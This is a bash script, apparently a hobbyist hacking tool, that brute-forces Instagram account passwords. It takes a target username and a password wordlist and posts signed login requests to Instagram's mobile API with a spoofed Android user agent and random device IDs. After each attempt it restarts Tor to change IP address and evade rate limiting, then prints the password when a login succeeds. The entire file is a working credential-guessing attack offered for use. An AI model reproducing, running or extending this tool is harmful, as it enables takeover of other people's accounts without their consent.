#!/bin/bash
#coded by Muhammad_Ameen
#v1.0

#colors
green='\033[1;32m'
red='\e[1;91m'
yellow='\e[0m\e[1;93m'
lightgreen='\e[1;32m'
farblos='\e[0m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
lightred='\e[101m'
blink='\e[5m'

startline_2=0

if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;91mYou need to be root to run this script\n\e[0m"
    exit 1
fi

command -v tor > /dev/null 2>&1 || { echo >&2 "You need TOR to run this script"; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "You need curl to run this script"; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo >&2 "You need openssl to run this script"; exit 1; }

read -p $'[\e[1;34m+\e[0m]\e[0m\e[1;93m Username: \e[0m' user
checkacc=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
if [[ "$checkacc" == 1 ]]; then
    echo -e "$red User not found! $farblos"
    echo -e "$yellow Try again $farblos"
    sleep 1
    exit 1
else
read -p $'[\e[1;34m+\e[0m]\e[0m\e[1;93m Wordlist: \e[0m' wl_pass
charsinwl=$(wc -l $wl_pass | cut -d " " -f1)
fi
clear
echo -e "[$red!$farblos]$yellow starting...$farblos "
sleep 3
clear

check_tor(){
check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)
if [[ "$check" -gt 0 ]]; then
  echo -e "$yellow[$BlueF*$yellow]$farblos Username: $cyan$user $farblos "
  echo -e "$yellow[$BlueF*$yellow]$farblos Wordlist: $cyan$wl_pass $farblos "
  echo -e "$yellow[$BlueF*$yellow]$farblos Password: $cyan$pass $farblos "
  echo -e "$yellow[$BlueF*$yellow]$farblos Tor:      "$cyan""Connection Lost" $farblos "
  echo -e "$yellow[$BlueF*$yellow]$farblos Attemps:  $cyan$startline $farblos "
  echo ""
  echo -e "$yellow[$BlueF!$yellow]$farblos""$red""Check your TOR connection!"
  exit 1
else
	tor_status="CONNECTED!"
fi
}

wordlist_end() {

if [ "$countpass" == "$charsinwl" ];
then
	echo ""
	echo -e "$yellow[$BlueF!$yellow]$farblos""$red"" Wordlist end!"
	exit 1
fi

}


attack() {
check_tor
counter=0
turn=$((start+end))
startline=1
endline=1
token=0
phone="$string8-$string4-$string4-$string4-$string12"
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
guid="$string8-$string4-$string4-$string4-$string12"
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
string4=$(openssl rand -hex 32 | cut -c 1-4)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
while [ "$token" -lt "$charsinwl" ]; do
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
IFS=$'\n'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

echo -e "$yellow[$BlueF*$yellow]$farblos Username: $cyan$user $farblos "
echo -e "$yellow[$BlueF*$yellow]$farblos Wordlist: $cyan$wl_pass $farblos "
echo -e "$yellow[$BlueF*$yellow]$farblos Password: $cyan$pass $farblos "
echo -e "$yellow[$BlueF*$yellow]$farblos Complete: $cyan($countpass/$charsinwl)"
echo -e "$yellow[$BlueF*$yellow]$farblos Tor:      $cyan$tor_status $farblos "
echo -e "$yellow[$BlueF*$yellow]$farblos Attemps:  $cyan$startline $farblos "

IFS=$'\n'
var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq );
if [[ $var == "challenge" ]]; then pw_found ; elif [[ $var == "logged_in_user" ]]; then pw_found ; elif [[ $var == "Please wait" ]]; then ip_blocked ; fi ;
let counter++
curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://instagram.com/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq
killall -HUP tor > /dev/null 2>&1
wordlist_end
let startline+=1
let endline+=1
clear
done
done
}

ip_blocked() {
echo ""
echo -e "$yellow[$BlueF!$yellow]$farblos""$red"" IP blocked! "
echo -e "$yellow[$BlueF!$yellow]$farblos""$red"" Try again later..."
exit 1
}

pw_found() {
echo ""
echo -e "$yellow[$BlueF+$yellow]$farblos Username: $cyan$user"
echo -e "$yellow[$BlueF+$yellow]$farblos Password: $cyan$pass"
echo -e "$green""Brute complete! $farblos" & exit & exit
}

attack






